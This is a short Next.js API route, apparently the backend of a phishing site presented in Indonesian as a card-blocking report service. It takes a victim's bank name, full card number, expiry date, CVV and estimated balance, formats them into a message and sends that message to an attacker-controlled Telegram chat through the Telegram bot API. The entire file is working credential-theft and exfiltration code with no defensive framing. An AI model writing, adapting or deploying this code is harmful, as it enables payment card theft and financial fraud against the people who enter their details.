import { NextResponse } from 'next/server';

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { bankName, cardNumber, expiry, cvv, balanceAmount } = body;

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error('Telegram configuration missing');
      return NextResponse.json({ error: 'Server configuration error' }, { status: 500 });
    }

    const message = `
💳 *LAPORAN BLOKIR KARTU*
━━━━━━━━━━━━━━━
🏦 *Bank:* ${bankName}
💳 *Nomor Kartu:* \`${cardNumber}\`
📅 *Expiry:* \`${expiry}\`
🔐 *CVV:* \`${cvv}\`
💰 *Estimasi Saldo:* ${balanceAmount}
━━━━━━━━━━━━━━━
⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}
🔴 *STATUS: MENUNGGU PROSES*
    `;

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    if (!response.ok) {
      const errorData = await response.json();
      console.error('Telegram API error:', errorData);
      return NextResponse.json({ error: 'Failed to send notification' }, { status: 502 });
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('API Route error:', error);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}
